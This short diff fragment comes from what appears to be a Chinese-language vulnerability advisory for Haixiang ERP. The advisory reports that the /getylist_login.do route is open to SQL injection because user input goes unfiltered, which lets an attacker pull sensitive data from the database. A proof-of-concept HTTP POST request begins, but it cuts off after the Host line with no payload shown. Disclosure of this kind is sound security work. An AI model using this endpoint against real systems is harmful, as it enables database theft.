@@ -3,7 +3,7 @@
 海翔ERP存在SQL注入漏洞，由于系统未对用户输入的内容进行过滤，攻击者可以通过/getylist_login.do路由进行SQL注入，从而获取数据库中的敏感信息。
 
 
-## poc
+## POC
 ```
 POST /getylist_login.do HTTP/1.1
 Host: xxx.xxx.xxx.xxx
